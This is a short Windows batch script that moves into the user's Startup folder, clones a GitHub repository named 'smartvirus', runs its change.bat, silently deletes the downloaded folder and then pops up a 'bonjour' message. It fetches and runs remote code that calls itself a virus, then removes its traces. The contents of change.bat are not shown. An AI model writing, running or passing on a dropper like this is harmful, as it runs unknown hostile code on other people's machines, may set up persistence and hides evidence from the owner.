cd AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
timeout 2
git clone https://github.com/mattistjnn/smartvirus
cd smartvirus
Start change.bat
cd ..
rmdir /s /q smartvirus 
pause
msg * "bonjour"